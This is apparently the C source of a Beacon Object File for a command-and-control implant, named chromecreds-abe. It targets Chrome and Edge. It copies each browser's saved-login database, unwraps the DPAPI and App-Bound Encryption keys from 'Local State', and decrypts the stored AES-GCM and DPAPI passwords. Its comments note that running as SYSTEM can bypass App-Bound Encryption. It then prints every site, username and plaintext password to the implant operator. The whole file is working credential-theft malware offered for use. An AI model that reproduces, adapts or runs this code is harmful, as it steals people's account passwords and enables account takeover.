/*
 * bof-chromecreds-abe [chrome|edge|all]
 *
 * Chrome / Edge login extraction with App-Bound Encryption support.
 *
 * The `Login Data` SQLite database and `Local State` file are copied to %TEMP%
 * first.  Passwords are decrypted as follows:
 *   v10/v11  AES-256-GCM with the DPAPI-protected key from Local State
 *   v20      AES-256-GCM with the app-bound key from Local State (APPB)
 *   legacy   DPAPI CryptUnprotectData blob
 *
 * App-bound keys normally require Chrome's elevation service, but when the
 * BOF runs as SYSTEM the machine+user DPAPI unwrap of the "APPB" blob often
 * succeeds.  If it does not, the entry is reported as ABE-protected instead
 * of being silently dropped.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "cryptoh.h"
#include "sqlite.h"

static void val_str(bof_sqlite_value *v, char *out, int outsz)
{
    out[0] = 0;
    if (!v || v->type != 3 || v->len <= 0) return;
    if (v->len >= outsz) {
        bof_memcpy(out, v->text, (unsigned int)outsz - 1);
        out[outsz - 1] = 0;
    } else {
        bof_memcpy(out, v->text, (unsigned int)v->len);
        out[v->len] = 0;
    }
}

/* Pull "name":"value" out of a JSON blob without a JSON parser. */
static int json_string(const char *json, const char *name, char *out, int outsz)
{
    char key[128];
    const char *p;
    int o = 0;
    out[0] = 0;
    bof_strncpy(key, "\"", sizeof(key));
    bof_strncat(key, name, sizeof(key) - bof_strlen(key) - 1);
    bof_strncat(key, "\"", sizeof(key) - bof_strlen(key) - 1);
    p = bof_strstr(json, key);
    if (!p) return -1;
    p += bof_strlen(key);
    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
    if (*p != ':') return -1;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
    if (*p != '"') return -1;
    p++;
    while (*p && *p != '"' && o < outsz - 1) out[o++] = *p++;
    out[o] = 0;
    return o > 0 ? 0 : -1;
}

static int dpapi_unwrap(const unsigned char *in, int inlen,
                        unsigned char *out, int outcap)
{
    DATA_BLOB din, dout;
    din.pbData = (BYTE *)in;
    din.cbData = (DWORD)inlen;
    bof_memzero(&dout, sizeof(dout));
    if (!CRYPT32$CryptUnprotectData(&din, NULL, NULL, NULL, NULL, 0, &dout))
        return -1;
    if (dout.cbData > (DWORD)outcap) {
        KERNEL32$LocalFree(dout.pbData);
        return -1;
    }
    bof_memcpy(out, dout.pbData, dout.cbData);
    {
        int n = (int)dout.cbData;
        bof_memzero(dout.pbData, dout.cbData);
        KERNEL32$LocalFree(dout.pbData);
        return n;
    }
}

static int load_json_key(const char *local_state, const char *name,
                         unsigned char *key, int keycap)
{
    unsigned char *file = NULL;
    unsigned int size = 0;
    char *json;
    char b64[8192];
    unsigned char raw[4096];
    int n, r;

    if (bof_read_file(local_state, &file, &size) != 0) return -1;
    json = (char *)KERNEL32$VirtualAlloc(NULL, size + 1,
              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!json) {
        KERNEL32$VirtualFree(file, 0, MEM_RELEASE);
        return -1;
    }
    bof_memcpy(json, file, size);
    json[size] = 0;
    KERNEL32$VirtualFree(file, 0, MEM_RELEASE);

    r = json_string(json, name, b64, sizeof(b64));
    KERNEL32$VirtualFree(json, 0, MEM_RELEASE);
    if (r != 0) return -1;

    n = bof_b64_decode(b64, raw, sizeof(raw));
    if (n <= 0) return -1;

    if (n > 5 && bof_memcmp(raw, "DPAPI", 5) == 0) {
        r = dpapi_unwrap(raw + 5, n - 5, key, keycap);
        if (r > 0) return r;
    }
    if (n > 4 && bof_memcmp(raw, "APPB", 4) == 0) {
        r = dpapi_unwrap(raw + 4, n - 4, key, keycap);
        if (r > 0) return r;
    }
    if (n <= keycap) {
        bof_memcpy(key, raw, n);
        return n;
    }
    return -1;
}

static void print_secret(const unsigned char *p, int n,
                         const unsigned char *v10key, int v10len,
                         const unsigned char *v20key, int v20len)
{
    if (!p || n <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <empty>\n");
        return;
    }
    if (n >= 3 && p[0] == 'v' && p[1] == '1' && (p[2] == '0' || p[2] == '1')) {
        if (v10key && v10len >= 32 && n > 3 + 12 + 16) {
            unsigned char out[1024];
            int m = bof_aes_gcm_decrypt(v10key, 32, p + 3, 12,
                                        p + 15, n - 15 - 16,
                                        p + n - 16, 16, out, sizeof(out));
            if (m >= 0) {
                char pw[1024];
                int i;
                if (m >= (int)sizeof(pw)) m = sizeof(pw) - 1;
                for (i = 0; i < m; i++) pw[i] = (char)out[i];
                pw[m] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "  password: %s\n", pw);
                bof_memzero(out, sizeof(out));
                return;
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <v10/v11 AES-GCM, key unavailable>\n");
        return;
    }
    if (n >= 3 && p[0] == 'v' && p[1] == '2' && p[2] == '0') {
        if (v20key && v20len >= 32 && n > 3 + 12 + 16) {
            unsigned char out[1024];
            int m = bof_aes_gcm_decrypt(v20key, 32, p + 3, 12,
                                        p + 15, n - 15 - 16,
                                        p + n - 16, 16, out, sizeof(out));
            if (m >= 0) {
                char pw[1024];
                int i;
                if (m >= (int)sizeof(pw)) m = sizeof(pw) - 1;
                for (i = 0; i < m; i++) pw[i] = (char)out[i];
                pw[m] = 0;
                BeaconPrintf(CALLBACK_OUTPUT, "  password: %s\n", pw);
                bof_memzero(out, sizeof(out));
                return;
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT,
                     "  password: <v20 App-Bound Encryption, ABE key unavailable>\n");
        return;
    }

    {
        DATA_BLOB in, out;
        in.pbData = (BYTE *)p;
        in.cbData = (DWORD)n;
        bof_memzero(&out, sizeof(out));
        if (CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            if ((out.cbData % 2) == 0) {
                char pw[1024];
                wchar_t w[512];
                int chars = (int)(out.cbData / 2);
                if (chars > 511) chars = 511;
                bof_memcpy(w, out.pbData, chars * 2);
                w[chars] = 0;
                bof_w2a(w, pw, sizeof(pw));
                BeaconPrintf(CALLBACK_OUTPUT, "  password: %s\n", pw);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "  password: <binary %lu bytes>\n",
                             (unsigned long)out.cbData);
            }
            bof_memzero(out.pbData, out.cbData);
            KERNEL32$LocalFree(out.pbData);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  password: <dpapi failed: %lu>\n",
                         (unsigned long)KERNEL32$GetLastError());
        }
    }
}

typedef struct {
    int shown;
    unsigned char v10[64], v20[64];
    int v10len, v20len;
} abe_ctx;

static int login_row(void *ctxp, int ncols, bof_sqlite_value *v)
{
    abe_ctx *ctx = (abe_ctx *)ctxp;
    char origin[512], user[256];

    if (ncols < 6) return 0;
    val_str(&v[0], origin, sizeof(origin));
    val_str(&v[3], user, sizeof(user));
    if (!origin[0] && !user[0]) return 0;
    if (v[5].type == 1 && v[5].i != 0) return 0;

    BeaconPrintf(CALLBACK_OUTPUT, "%s\n  user    : %s\n", origin, user);
    if (v[5].type == 4)
        print_secret(v[5].blob, v[5].len, ctx->v10, ctx->v10len,
                     ctx->v20, ctx->v20len);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "  password: <none saved>\n");
    ctx->shown++;
    return 0;
}

static void dump_browser(const char *label, const char *dbpath,
                         const char *localstate)
{
    char tmp[MAX_PATH + 64];
    bof_sqlite_db sdb;
    unsigned int root;
    abe_ctx ctx;

    bof_memzero(&ctx, sizeof(ctx));
    ctx.v10len = load_json_key(localstate, "encrypted_key", ctx.v10, sizeof(ctx.v10));
    ctx.v20len = load_json_key(localstate, "app_bound_encrypted_key",
                               ctx.v20, sizeof(ctx.v20));

    KERNEL32$GetTempPathA(sizeof(tmp), tmp);
    bof_strncat(tmp, "bof_logindata_abe.db", sizeof(tmp) - bof_strlen(tmp) - 1);
    KERNEL32$DeleteFileA(tmp);

    if (!KERNEL32$CopyFileA(dbpath, tmp, FALSE)) {
        if (bof_sqlite_open(&sdb, dbpath) != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "  %s: database unreadable\n", label);
            return;
        }
    } else if (bof_sqlite_open(&sdb, tmp) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s: not a SQLite database\n", label);
        KERNEL32$DeleteFileA(tmp);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s ===\n", label);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] v10 key: %s, ABE key: %s\n",
                 ctx.v10len >= 32 ? "loaded" : "missing",
                 ctx.v20len >= 32 ? "loaded" : "missing");
    root = bof_sqlite_table_root(&sdb, "logins");
    if (!root) {
        BeaconPrintf(CALLBACK_OUTPUT, "  no saved logins\n");
    } else {
        bof_sqlite_scan(&sdb, root, login_row, &ctx);
        BeaconPrintf(CALLBACK_OUTPUT, "\n  %d login(s)\n", ctx.shown);
    }
    bof_sqlite_close(&sdb);
    KERNEL32$DeleteFileA(tmp);
    bof_memzero(ctx.v10, sizeof(ctx.v10));
    bof_memzero(ctx.v20, sizeof(ctx.v20));
}

void go(char *args, int alen)
{
    datap parser;
    char *mode = "";
    int mlen = 0;
    char db[MAX_PATH], ls[MAX_PATH];
    int do_chrome, do_edge;

    BeaconDataParse(&parser, args, alen);
    mode = BeaconDataExtract(&parser, &mlen);
    if (!mode) mode = "";

    do_chrome = (!mode[0] || bof_stricmp(mode, "chrome") == 0 ||
                 bof_stricmp(mode, "all") == 0);
    do_edge   = (!mode[0] || bof_stricmp(mode, "edge") == 0 ||
                 bof_stricmp(mode, "all") == 0);
    if (!do_chrome && !do_edge) {
        BeaconPrintf(CALLBACK_ERROR, "usage: chromecreds-abe [chrome|edge|all]\n");
        return;
    }

    if (do_chrome) {
        db[0] = ls[0] = 0;
        if (KERNEL32$ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
                db, sizeof(db)) &&
            KERNEL32$ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
                ls, sizeof(ls)))
            dump_browser("Chrome", db, ls);
    }
    if (do_edge) {
        db[0] = ls[0] = 0;
        if (KERNEL32$ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                db, sizeof(db)) &&
            KERNEL32$ExpandEnvironmentStringsA(
                "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State",
                ls, sizeof(ls)))
            dump_browser("Edge", db, ls);
    }
}
